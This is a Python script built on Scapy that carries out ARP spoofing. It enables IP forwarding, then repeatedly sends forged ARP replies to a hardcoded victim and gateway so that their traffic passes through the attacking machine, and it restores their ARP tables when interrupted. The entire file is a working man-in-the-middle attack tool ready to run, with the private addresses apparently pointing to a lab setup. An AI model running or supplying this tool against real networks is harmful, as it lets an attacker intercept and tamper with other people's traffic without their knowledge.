from scapy.all import Ether, ARP, srp, send
import time

class ARPSPoofer:

    def __init__(self, target_ip, host_ip, verbose= True):
        self.target_ip = target_ip
        self.host_ip = host_ip
        self.verbose = verbose
        
    def hability_routing_ip(self):
        if self.verbose:
            print('Routing IP permited...')
            file_path = "/proc/sys/net/ipv4/ip_forward"
            with open(file_path) as file:
                if file.read() == '1':
                    return
            with open(file_path, 'w') as file:
                print(1, file=file)
            if self.verbose:
                print('Routing IP activated...')
    @staticmethod
    def get_mac(ip):
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=3, verbose=0)
        if ans:
            return ans[0][1].src
        
    def spoofing(self, ip_target, ip_host):
        objective_mac = self.get_mac(ip_target)
        ans_arp = ARP(
            pdst = ip_target,
            hwdst = objective_mac,
            psrc = ip_host,
            op = 'is-at'
        )
        send(ans_arp, verbose = 0)
        if self.verbose:
            own_mac = ARP().hwsrc
            print(f'Paquete ARP enviado a {ip_target}: {ip_host} esta en {own_mac}')

    def restarting(self, ip_target, ip_host):
        objective_mac = self.get_mac(ip_target)
        host_mac = self.get_mac(ip_host)
        ans_arp = ARP(
            pdst = ip_target,
            hwdst = objective_mac,
            psrc = ip_host,
            hwsrc = host_mac,
            op = 'is-at'
        )
        send(ans_arp, verbose = 0, count=15)
        if self.verbose:
            print(f'Restarting {ip_target}: {ip_host} is at {host_mac}')


if __name__ == "__main__":
    victim = "192.168.238.131"
    gateway = "192.168.238.2"
    spoofer = ARPSPoofer(victim, gateway)
    spoofer.hability_routing_ip()
    try:
        while True: 
            spoofer.spoofing(victim,gateway)
            spoofer.spoofing(gateway, victim)
            time.sleep(1)
    except KeyboardInterrupt:
        print('Stopping ARP spoofing..')
        spoofer.restarting(victim, gateway)
        spoofer.restarting(gateway, victim)